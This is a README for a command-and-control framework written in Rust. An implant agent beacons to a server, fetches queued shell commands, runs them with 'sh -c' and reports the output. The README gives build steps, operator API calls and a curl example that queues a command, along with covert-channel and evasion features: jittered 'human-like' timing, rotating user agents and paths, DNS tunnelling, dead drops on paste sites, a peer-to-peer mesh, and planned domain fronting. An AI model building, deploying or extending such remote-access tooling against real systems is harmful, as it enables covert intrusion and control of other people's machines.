# C2-System

A small command & control system. An **agent** beacons to a **server**; an
operator queues commands over the server's HTTP API; the agent picks them up on
its next beacon, runs them, and posts the result back.

```
operator ──POST /command──▶ server ──pending queue──▶ agent beacon
                             ▲                          │
                             └──── POST result ◀────────┘ (sh -c, timeout)
```

## Quick start

```bash
cargo build --release

# terminal 1 — server
./target/release/server --bind 127.0.0.1:8080 --master-key change-me

# terminal 2 — agent
./target/release/agent --server http://127.0.0.1:8080 --master-key change-me --sleep 2000
```

The agent registers on its first beacon. Check it:

```bash
curl -s localhost:8080/agents
```

The master key must be identical on both sides. A mismatch makes the server
reject the beacon envelope with `400`.

## Control model

It is pull-based. Nothing is pushed to an agent.

1. The agent beacons every `--sleep` ms plus jitter.
2. The server answers the beacon with all commands waiting for that agent, and
   clears them from the queue.
3. The agent runs each command with `sh -c`, then posts a result.
4. The result shows up under the agent.

So a queued command runs within one beacon interval (default `--sleep 60000`,
i.e. one minute). Use a short `--sleep` when you are testing.

## Operator API

All paths are relative to `--bind` (default `0.0.0.0:8080`).

| Method | Path | Purpose |
|---|---|---|
| GET | `/health` | liveness, returns `OK` |
| GET | `/status` | role, agent count, peer count, pending count |
| GET | `/agents` | all agents with pending commands and results |
| GET | `/agents/{id}` | one agent |
| POST | `/command` | queue a command |
| POST | `/beacon` | agent beacon (agent protocol) |
| POST | `/api/beacon` | same as `/beacon` (agent path rotation) |
| POST | `/response` | command result (agent protocol) |

### Queue a command

```bash
# find the agent id
AGENT=$(curl -s localhost:8080/agents \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)[0]["id"])')

# queue it
curl -s -X POST localhost:8080/command \
  -H 'content-type: application/json' \
  -d "{\"agent_id\":\"$AGENT\",\"command\":\"id\",\"timeout\":10000}"
# -> {"command_id":"...","status":"queued"}
```

Body fields:

| Field | Required | Meaning |
|---|---|---|
| `agent_id` | yes | target agent UUID |
| `command` | yes | shell command, run as `sh -c "<command>"` |
| `working_dir` | no | working directory |
| `timeout` | no | milliseconds; default 30 000 |

`404 unknown agent` means the agent has not beaconed yet (or the id is wrong).

### Read results

```bash
curl -s localhost:8080/agents/$AGENT
```

```json
{
  "id": "65b9...",
  "last_seen": "2026-11-06T23:01:06.982204Z",
  "role": "Slave",
  "channel": "Https",
  "capabilities": ["shell", "file"],
  "pending": [],
  "results": [
    {
      "command_id": "5d39...",
      "agent_id": "65b9...",
      "status": "Success",
      "output": [100,111,99,45,99,104,101,99,107,10],
      "error": null,
      "completed_at": "2026-11-06T23:01:03.312423Z"
    }
  ]
}
```

`output` is a **byte array** (stdout, capped at 1 MiB). Decode it:

```bash
curl -s localhost:8080/agents/$AGENT | jq -r '.results[-1].output | implode'
# or
curl -s localhost:8080/agents/$AGENT \
  | python3 -c 'import json,sys; r=json.load(sys.stdin)["results"][-1]; print(bytes(r["output"]).decode())'
```

`status` is `Success`, `Failed`, or `Timeout`. On `Failed`, stderr is in
`error`. Only stdout is kept from a successful command.

## Server CLI

```bash
server --bind 0.0.0.0:8080 \
       --master-key <string> \
       --role master|slave|node|hybrid \
       --state c2-state.json \
       --master-server http://master:8080 \
       --p2p-enabled \
       --p2p-bootstrap /ip4/1.2.3.4/tcp/4001/p2p/<peer-id> \
       --config config/server.toml \
       --log-level info
```

| Flag | Default | Meaning |
|---|---|---|
| `--bind` | `0.0.0.0:8080` | HTTP listen address |
| `--master-key` | `default_master_key` | envelope key; must match agents |
| `--role` | `hybrid` | role label |
| `--state` | `c2-state.json` | JSON state file; empty string disables persistence |
| `--master-server` | — | makes a `slave`/`hybrid` server beacon upward |
| `--p2p-enabled` | off | start the libp2p node |
| `--p2p-bootstrap` | — | multiaddrs to dial |
| `--config` | `config/server.toml` | TOML config, loaded only if the file exists |
| `--log-level` | `info` | `tracing` level |

Roles: `master`, `hybrid`, and `node` always serve HTTP. `slave` and `hybrid`
also beacon to `--master-server` when it is set. `--p2p-enabled` starts the
mesh node regardless of role.

## Agent CLI

```bash
agent --server http://127.0.0.1:8080 --master-key <string> --sleep 60000 --jitter 0.3
```

| Flag | Default | Meaning |
|---|---|---|
| `--server` | `http://localhost:8080` | C2 server URL |
| `--master-key` | `default_master_key` | must match the server |
| `--id` | random | fixed agent UUID (otherwise a new one each start) |
| `--sleep` | `60000` | base beacon interval, ms |
| `--jitter` | `0.3` | delay fraction; used only when human-like timing is off (it is on by default) |
| `--name` | `agent` | label, log only |
| `--log-level` | `info` | `tracing` level |

The agent starts in registration, retries with exponential backoff (5 s → 5 min)
until a beacon succeeds, then beacons on the jittered interval. On a failed
beacon it sleeps and retries.

## Encryption

Envelopes are sealed with the master key:

- Key: `SHA-256(master_key)`, 32 bytes.
- Payload: `nonce(12) || AES-256-GCM(ciphertext + tag)`.
- `auth_tag`: first 16 bytes of `HMAC-SHA256(key, encrypted_payload)`.
- AAD: `version:sequence:timestamp:` + the JSON channel name.

The server opens a sealed envelope, checks the HMAC, and decrypts. Results from
the agent are sealed the same way. The server also accepts **raw JSON beacons**
(unsealed) for slave daemons, and answers them with raw JSON.

**The operator API is not authenticated.** `POST /command` takes plain JSON and
runs a shell on an agent. Bind the server to a private address or firewall the
port. Sealed commands are accepted too (post a sealed envelope to `/command`).

## Persistence

With `--state`, the server writes all agents (beacon, role, queue, results) to
a JSON file after every change, and loads it at startup. The file is plain
JSON, so command text is stored unencrypted. Use one server process per file.

## Configuration file

`--config` is parsed as `C2Config` from `src/common/config.rs`. The file must
define **every** field (`agent`, `server`, `channels`, `crypto`, `transport`)
or parsing fails and the server exits. The easiest option is to pass no config
file and use flags.

## Channels

Every transport implements the same trait, `C2Channel`
(`src/protocols/mod.rs`): `send(&MessageEnvelope)`, `receive(timeout)`,
`health_check()`, plus latency and reliability scores. The unit on the wire is
always a `MessageEnvelope` — version, sequence, timestamp, channel, encrypted
payload, auth tag.

| Channel | File | Used by `agent` | Used by `server` |
|---|---|---|---|
| HTTPS | `protocols/http.rs` | yes (primary) | yes (`/beacon`) |
| WebSocket | `protocols/http.rs` | no (stub) | no |
| DNS | `protocols/dns.rs` | no | no (no DNS server exists) |
| P2P | `protocols/p2p.rs` | no (library only) | yes with `--p2p-enabled` |
| Dead drop | `protocols/dead_drop.rs` | no | no |

### HTTPS

`HttpsChannel` (`protocols/http.rs`) is the channel the agent actually uses.

- Configuration: `endpoints` (url, method, path, priority), `user_agents`,
  `headers`, `timeout_ms`, `connection_timeout_ms`, `path_rotation`.
- `send` picks the next endpoint round-robin, picks the next user agent, and
  picks the next path from `path_rotation` (so traffic alternates between
  `/beacon` and `/api/beacon`). It POSTs the envelope as JSON; if the endpoint
  method is GET, it base64-encodes the envelope into `?data=`.
- The reply is read right there. If the reply body parses as a
  `MessageEnvelope`, it is buffered; the next `receive()` returns it. This is
  how commands arrive: the server answers the beacon with the queued commands,
  and the agent reads them from the same reply. There is no separate poll.
- Health is recorded per request (latency, success rate, consecutive
  failures). See the scoring below.
- Not applied yet: `domain_fronting` and `tls_verify` are in the config but the
  reqwest client is built without them. Use `https://` endpoints if you need
  TLS; the shipped agent config uses `http://`.

### WebSocket

`WebSocketChannel` (`protocols/http.rs`) has a config (url, subprotocols, ping
interval) but is a stub: `send` serializes the envelope and reports success
without opening a socket, `receive` returns `None`.

### DNS

`DnsChannel` (`protocols/dns.rs`) is a client for a DNS tunnel you run
yourself.

- Encode: envelope JSON → base32 (Crockford alphabet) → split into
  `chunk_size`-byte chunks. Each chunk becomes one lookup:
  `<sequence>.<subdomain_prefix>.<encoded_chunk>.<domain>`, record type TXT.
- The sequence number advances after all chunks of one message.
- Receive: a TXT lookup of `resp-<sequence>.<subdomain_prefix>.<domain>`.
  All TXT answers are base32-decoded, concatenated, and parsed as an envelope.
- Resolver: system configuration by default (hickory-resolver); `resolver` is
  accepted in the config.
- You need an authoritative DNS server that logs the query labels (that is how
  a beacon reaches you) and answers `resp-*` with TXT chunks. Nothing in this
  repo does that.
- Keep chunks small. Each chunk is a single DNS label, and labels are limited
  to 63 bytes; 32 raw bytes become 52 base32 characters.
- Only TXT is queried. `DnsRecordType::{NULL, CNAME, A}` exist in the config
  enum but are not used.
- `DnsTunnel` (`protocols/dns.rs`) wraps the channel with
  `send_command`/`receive_response`.

### P2P

`P2PChannel` (`protocols/p2p.rs`) is a real libp2p node. `server
--p2p-enabled` starts one; `--p2p-bootstrap` takes multiaddrs.

- Transport: TCP + Noise handshake + Yamux multiplexing.
- Behaviours: gossipsub (messages signed with the node key), identify, mDNS.
- Subscribes to `c2-messages` and `c2-discovery`. Dials the bootstrap
  multiaddrs. mDNS finds LAN peers, dials them, and adds them as explicit
  gossipsub peers.
- `send` publishes the envelope JSON to `c2-messages`. Incoming gossipsub
  messages are parsed and buffered; `receive` returns one.
- `broadcast` returns the current peer count. `query_dht` returns the
  configured `known_servers` (the Kademlia feature is enabled but no query is
  made yet).
- The node logs its peer id and peer count every 30 s; `/status` reports the
  peer count.
- No routing yet: P2P messages are buffered but not fed into an agent's command
  queue.

**Connecting two nodes:**

1. Start the first node with `--p2p-enabled`. On startup it logs one line per
   network interface:

   ```
   P2P listening on /ip4/172.18.0.9/tcp/57464/p2p/12D3KooWCRyc2MCB9xtbenJPwT2F5sGL9yTGa8gFzBeH29D2XqnP
   ```

2. Copy the line whose IP the other host can reach. That whole string is the
   bootstrap multiaddr.
3. Start the second node with `--p2p-bootstrap <that line>`.
4. Success looks like `P2P peer connected: 12D3KooW...` on both sides. A bad
   address logs `P2P dial failed (...)`.

The `/p2p/` part must be the node's libp2p peer id (base58, `12D3KooW...`).
It is **not** the daemon UUID shown by `/status` — a UUID in that position
fails to parse and is ignored.

Two nodes on the same LAN also find each other without any bootstrap address:
mDNS discovers them and dials automatically. Every node still needs
`--p2p-enabled`.

P2P is a message mesh, not a command path. An agent or slave still needs the
HTTP `--master-server` (or `--server`) for commands.

### Dead drops

`DeadDropChannel` (`protocols/dead_drop.rs`) stores messages on an HTTP
endpoint you control (Pastebin, a Gist, a bucket, anything that accepts a POST
body and returns it on GET).

- A drop is a `DeadDropConfig`: `url`, `filename`, `check_interval_ms`,
  `auth_token`, `enabled`, `encoding`.
- `send` picks the next enabled drop round-robin, JSON-encodes the envelope,
  encodes it (Base64, Base32, Hex; Steganography falls back to Base64), POSTs
  the encoded text as the body, and adds `Authorization: Bearer <token>` when
  `auth_token` is set.
- `receive` GETs the first enabled drop, decodes the body by the configured
  encoding, and parses it as an envelope. An empty body means "nothing new".
- `DeadDropManager` can upload to every drop and check every drop.
- It uses `reqwest::blocking` from the synchronous trait methods, so a dead
  drop blocks the calling thread for the duration of the request.

### Health scoring

Channels report latency, success rate, and consecutive failures. The score is

```
0.3 * (1 - min(latency_ms / 5000, 1)) + 0.5 * success_rate + 0.2 * (1 - min(failures / 10, 1))
```

The beacon engine picks the highest-scoring healthy channel after a successful
registration. The shipped agent has one channel, so this only matters if you
add more in code.

## Binaries

| Binary | Purpose |
|---|---|
| `server` | HTTP C2 server (this document's main subject) |
| `agent` | implant: beacon, execute, report |
| `daemon` | all-in-one daemon (master + slave + node). As a slave it executes commands from `--master-server` and reports the results back. Its own master mode does not deliver queued commands. |

## Tests

```bash
cargo test
```

Covered: crypto round-trips, beacon jitter/backoff, executor success and
timeout, server queue/record, and a full sealed HTTP round trip
(beacon → queue → deliver → report).

## Known limits

- Operator API has no authentication or TLS.
- A command is removed from the queue when it is delivered. If the reply is
  lost in flight, the command is lost.
- A replayed sealed beacon is accepted (no timestamp check yet).
- `results` is never trimmed; it grows for the life of an agent.
- The `server` binary in slave mode beacons upward but does not apply commands
  from the master. The `daemon` binary does apply and report them.
- The binaries move commands over HTTPS only. WebSocket is a stub; the DNS and
  dead-drop channels are working clients with nothing on the server side; the
  P2P node runs and exchanges messages but does not route commands.
- The agent's TLS verification flag is set but the shipped configuration uses
  plain `http://` endpoints.
